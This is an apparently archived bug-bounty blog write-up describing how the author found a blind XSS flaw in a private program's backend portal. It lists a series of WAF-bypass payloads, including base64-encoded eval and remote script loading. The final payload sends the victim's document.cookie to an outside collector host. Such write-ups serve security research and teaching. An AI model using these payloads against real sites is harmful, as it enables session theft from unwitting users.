---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-11_blind-xss-a-mind-game-to-win-the-battle.md
original_filename: 2019-12-11_blind-xss-a-mind-game-to-win-the-battle.md
title: Blind XSS (A mind game to win the battle)
category: documents
detected_topics:
- xss
- command-injection
- cors
tags:
- imported
- documents
- xss
- command-injection
- cors
language: en
raw_sha256: 37832f6721bec2e1db6f0a22ea837203111a46c504af0744f3b831293dd40b66
text_sha256: bf2ef6bf19d66b05d66579fb679e6dc0a4039f0c489d48e443625dd94e7d1bdf
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Blind XSS (A mind game to win the battle)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-11_blind-xss-a-mind-game-to-win-the-battle.md
- Source Type: markdown
- Detected Topics: xss, command-injection, cors
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `37832f6721bec2e1db6f0a22ea837203111a46c504af0744f3b831293dd40b66`
- Text SHA256: `bf2ef6bf19d66b05d66579fb679e6dc0a4039f0c489d48e443625dd94e7d1bdf`


## Content

---
title: "Blind XSS (A mind game to win the battle)"
page_title: "Blind Xss (A mind game to win the battle) | by Dirtycoder | Medium"
url: "https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678?"
authors: ["Dirtycoder (@dirtycoder0124)"]
bugs: ["Blind XSS"]
bounty: "1,000"
publication_date: "2019-12-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4896
scraped_via: "browseros"
---

# Blind XSS (A mind game to win the battle)

Blind Xss (A mind game to win the battle)
Dirtycoder
Follow
2 min read
·
Dec 11, 2019

232

2

In this write-up, I will explain how I exploited a blind XSS in the backend portal of a program.

I will not take much time and keep the write-up simple and point to point.

It was a private program so we will call it https://redacted.com.

I used https://blindf.com in order to exploit it. It's a platform/tool/framework to find blind XSS.

Attack Starts:

Found a form on https://redacted.com
I put Bhtml payload + BXSS payload in the text field

Payload:

<img src="https://blindf.com/b.php?c=redacted_bhtml_execution"/>"></script><script src=https://blindf.com/bx.php></script>

Result: WAF stopped me to submit the form.

3. I removed the BXSS payload. Now the payload was

Payload:

<img src="https://blindf.com/b.php?c=redacted_bhtml_execution"/>

Result: WAF did not stop me and I successfully submitted the form. Next day Blindf confirmed the BHTML payload execution in the backend. Now It’s time to submit the Bxss payload. Because I knew that the backend portal is vulnerable and I just have to submit the Bxss payload.

4. Next Payload used. BHTML + BXSS

Payload:

<img src="https://blindf.com/b.php?c=redacted_bhtml_execution"/>"><svg onload='with(top)body.appendChild(createElement("script")).src="https://blindf.com/bx.php"'>

Result: WAF did not stop me and I successfully submitted the payload. But again only BHTML payload worked and BXSS did not. Now again, its time to modify the payload.

5. Next payload used. BHTML + BXSS

Get Dirtycoder’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Payload:

<img src="https://blindf.com/b.php?c=redacted_bhtml_execution"/>">  sfds"><base href="https://blindf.com"><script nonce='secret' src='./bx.php'></script>

Result: WAF stopped me and I could not submit the form. Frustration was on the peak. Again its time to change the payload.

6. Next payload used. BHTML + BXSS

Payload:

<img src="https://blindf.com/b.php?c=redacted_bhtml_execution"/>">"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmxpbmRmLmNvbS9ieC5waHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>

Result: Bypassed the WAF but again only BHTML worked and BXSS failed. Now it was not the time of payload modification but thinking about the situation.

Situation step by step:

I used BHTML + BXSS payloads.
Some Bxss payloads bypassed the WAF but did not execute in the backend portal where Bhtml payloads were going well and I was receiving back response from my BHTML payloads.
Maybe something was stopping my remote js file from execution. [CORS or Same-origin policy]
So I have to execute BXSS without including remote js file.
But how can I confirm the payload execution in the backend if I just show an alert popup to them
“<img” tag was working but I could not include remote js file.
I have to make a payload that can respond back and confirm js code execution.

7. Now it’s time to modify the payload and attack again.

Payload used:

<img src="https://blindf.com/b.php?c=redacted_bhtml_execution"/>">  <img src=https://blindf.com/a.jpg onload=this.src='https://blindf.com/oc.php/?c='+document.cookie>

Result: WAF bypassed. Bhtml payload executed. Bxss payload executed and I got the cookie value.

Severity: Critical (9 ~ 10)

Bounty: $1000
